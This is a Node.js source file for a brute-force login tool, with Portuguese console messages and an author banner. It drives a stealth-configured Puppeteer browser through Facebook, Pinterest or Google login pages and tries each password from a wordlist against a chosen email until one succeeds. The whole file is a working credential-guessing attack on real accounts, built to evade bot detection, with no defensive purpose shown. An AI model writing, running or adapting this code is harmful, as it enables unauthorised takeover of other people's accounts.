const axios = require("axios");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const { ArgumentParser } = require("argparse");
const fs = require("fs");
//require('dotenv').config({ path: 'config.env' })
require("colors");

puppeteer.use(StealthPlugin());

const parser = new ArgumentParser({
  description: "parameters example"
});

const banner = `
█████████
█▄█████▄█
█▼▼▼▼▼
█      Author: CarlosAllberto
█▲▲▲▲▲
█████████
_ ██____██___
`;

parser.add_argument("-s", "--site",  { help: "facebook, instagram, google" });
parser.add_argument("-e", "--email", { help: "email or id" });
parser.add_argument("-p", "--password", { help: "password file with wordlist.txt" });

const argSite = parser.parse_args().site;
const argEmail = parser.parse_args().email;
const argPassword = parser.parse_args().password;

class brute {
  constructor(site, email, passwordFile) {
    this.site = site;
    this.email = email;
    this.passwordFile = passwordFile;
    console.clear();
    console.log(banner.bold.green);
  }

  test() {
    axios.get("https://http.cat")
    .then(() => {
      //pass
    })
    .catch(() => {
      console.log("\n[!] INTERNET: OFF\n".underline.yellow);
      process.exit(1);
    });
  }

  testFile() {
    fs.readFile(this.passwordFile, { encoding: "utf-8" }, (err, data) => {
      if (err) {
        console.log("\n[!] NÃO FOI POSSIVEL ENCONTRAR A WORDLIST\n".underline.yellow);
        process.exit(1);
      }
    });
  }

  loadConfig() {
    let data = fs.readFileSync("./config.json", { encoding: "utf-8" });
    let dataParse = JSON.parse(data);
    let config
    switch(this.site) {
      case "facebook":
        config = dataParse.facebook;
        break;
      case "pinterest":
        config = dataParse.pinterest;
        break;
      case "google":
        config = dataParse.google;
        break;
    }
    return config;
  }

  attackGoogle() {
    let config = new brute(site=argSite).loadConfig();
    this.testFile();
    let data = fs.readFileSync(this.passwordFile, { encoding: "utf-8" });
    console.log(`COMEÇANDO O ATAQUE NO GOOGLE`.bold.green);
    (async () => {
      let browser = await puppeteer.launch({
        args: ['--no-sandbox'],
        headless: false,
      });
      let page = await browser.newPage();
      await page.setUserAgent("Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0");
      await page.setExtraHTTPHeaders({
        'accept-language': 'en-US,en;q=0.9,hy;q=0.8'
      });
      await page.setViewport({
        width: 1006,
        height: 550
      });
      for(let password of data.split(/\r?\n/)) {
        await page.goto(config.url);
        await page.type(config.inputEmail, this.email);
        await page.click(config.buttonSubmit);
        //await page.waitForNavigation(); 
        await page.type(config.inputPassword, password);
        await page.click(config.buttonSubmit);
        await page.waitForNavigation();
        let urlPage = page.url();
        let pageContent = await page.content();
        if(urlPage == config.url || pageContent.indexOf(config.msgError) != -1) {
          console.log(`[-] SENHA ERRADA: ${password}`.red);
          await page.goBack();
        } else {
          console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green);
          break;
        }
      }
    })();
  }

  attack() {
    let config = new brute(site=argSite).loadConfig();
    this.testFile();
    let data = fs.readFileSync(this.passwordFile, { encoding: "utf-8" });
    console.log(`COMEÇANDO O ATAQUE EM ${this.site}\n`.bold.green);
    (async () => {
      let browser = await puppeteer.launch({
        args: ['--no-sandbox'],
        headless: false,
      });
      let page = await browser.newPage();
      await page.setUserAgent("Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0");
      await page.setViewport({
        width: 1006,
        height: 550
      });
      for(let password of data.split(/\r?\n/)) {
        await page.goto(config.url);
        await page.type(config.inputEmail, this.email);
        await page.type(config.inputPassword, password);
        await page.click(config.buttonSubmit);
        await page.waitForNavigation();
        let urlPage = page.url();
        let pageContent = await page.content();
        console.log(pageContent);
        if(urlPage == config.url || pageContent.indexOf(config.msgError) != -1) {
          console.log(`[-] SENHA ERRADA: ${password}`.red);
          await page.goBack();
        } else {
          console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green);
          break;
        }
      }
    })();
  }
}

var test = new brute().test();
if(argSite == "google") {
  var result = new brute(site=argSite, email=argEmail, passwordFile=argPassword).attackGoogle();
} else {
  var result = new brute(site=argSite, email=argEmail, passwordFile=argPassword).attack();
}